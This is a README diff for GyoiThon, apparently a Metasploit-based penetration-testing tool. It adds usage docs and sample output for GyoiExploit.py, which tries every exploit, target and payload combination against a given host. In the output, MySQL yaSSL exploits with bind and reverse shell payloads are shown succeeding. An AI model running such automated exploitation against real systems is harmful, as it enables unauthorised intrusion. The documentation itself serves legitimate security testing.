@@ -261,7 +261,7 @@ You have to separate IP address, port number and target path using single space.
 
  |Note|
  |:---|
- |Current `gyoithon.py` is provisional version that without crawling function. We'll upgrade `gyoithon.py` by April 9. Then, target path will be unnecessary.|
+ |Current `gyoithon.py` is provisional version that without crawling function. We'll add crawling functionality to GyoiThon coming soon.  Then, target path will be unnecessary.|
 
 #### Step.5 Run GyoiThon
 You execute GyoiThon following command.
@@ -358,7 +358,7 @@ xoops@(xoops\.css)
  |:---|
  |Above new product name must be a name that Metasploit can identify. And you have to separate new product name and regex pattern using `@`.|
 
-And you have to delete trained data (`*.pkl`).  
+In addition, since GyoiThon retrains with new training data, you have to delete old training data (`*.pkl`).  
 
 ```
 local@client:~$ ls "gyoithon root path"/classifier4gyoithon/trained_data/
@@ -394,6 +394,70 @@ If you want to change option values, please input any value to `"user_specify"` 
         },
 ```
 Above example is to change value of `TARGETURI` option in exploit module "`exploit/unix/webapp/joomla_media_upload_exec`" to "`/my_original_dir/`" from "`/joomla`".  
+
+#### 4. How to use each instance.
+##### `GyoiClassifier.py`  
+
+##### `GyoiExploit.py`
+You can execute exploits thoroughly using all combinations of "Exploit module", "Target" and "Payload" of Metasploit corresponding to user's indicated product name and port number.
+
+ * Usage 
+ ```
+ local@client:~$ python GyoiExploit.py -h
+ GyoiExploit.py
+ Usage:
+     GyoiExploit.py (-t <ip_addr> | --target <ip_addr>) (-p <port> | --port <port>) (-s <service> | --service <service>)
+     GyoiExploit.py -h | --help
+ 
+ Options:
+     -t --target   Require  : IP address of target server.
+     -p --port     Require  : Port number of target server.
+     -s --service  Require  : Service name (product name).
+     -h --help     Optional : Show this screen and exit.
+
+ local@client:~$ python GyoiExploit.py -t 192.168.220.145 -p 3306 -s mysql
+
+ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗██╗██╗
+   ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██║██║
+   █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ██║██║
+   ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ╚═╝╚═╝
+   ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ██╗██╗
+   ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝╚═╝
+ 　   __      _   _      _   _                 _        _
+ 　  / /  ___| |_( )__  | |_| |__   ___  _ __ | |_ __ _| | __
+ 　 / /  / _ \ __|/ __| | __| '_ \ / _ \| '_ \| __/ _` | |/ /
+ 　/ /__|  __/ |_ \__ \ | |_| | | | (_) | | | | || (_| |   <
+ 　\____/\___|\__||___/  \__|_| |_|\___/|_| |_|\__\__,_|_|\_
+ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ by GyoiExploit.py
+ 
+ [+] Get exploit list.
+ [*] Loading exploit list from local file: C:\Users\i.takaesu\Documents\GitHub\GyoiThon\classifier4gyoithon\data\exploit_list.csv
+ [+] Get exploit tree.
+ [*] Loading exploit tree from local file: C:\Users\i.takaesu\Documents\GitHub\GyoiThon\classifier4gyoithon\data\exploit_tree.json
+ [*] exploit/linux/mysql/mysql_yassl_getname, target: 0, payload: generic/custom, result: failure
+ [*] exploit/linux/mysql/mysql_yassl_getname, target: 0, payload: generic/debug_trap, result: failure
+ [*] exploit/linux/mysql/mysql_yassl_getname, target: 0, payload: generic/shell_bind_tcp, result: bingo!!
+ [*] exploit/linux/mysql/mysql_yassl_getname, target: 0, payload: generic/shell_reverse_tcp, result: failure
+ [*] exploit/linux/mysql/mysql_yassl_getname, target: 0, payload: generic/tight_loop, result: failure 
+ 
+ ...snip...
+ 
+ [*] exploit/linux/mysql/mysql_yassl_getname, target: 1, payload: linux/x86/shell_bind_tcp_random_port, result: failure
+ [*] exploit/linux/mysql/mysql_yassl_getname, target: 1, payload: linux/x86/shell_reverse_tcp, result: failure
+ [*] exploit/linux/mysql/mysql_yassl_hello, target: 0, payload: generic/custom, result: failure
+ [*] exploit/linux/mysql/mysql_yassl_hello, target: 0, payload: generic/debug_trap, result: bingo!!
+ [*] exploit/linux/mysql/mysql_yassl_hello, target: 0, payload: generic/shell_bind_tcp, result: failure
+ 
+ ...snip...
+```
+
+|option|description|
+|:---|:---|
+|-t, --target|IP address of target server.|
+|-p, --port|Target port number.|
+|-s, --service|Target service name identifiable by Metasploit.|
 
 ## Operation check environment
  * Kali Linux 2017.3 (for Metasploit)
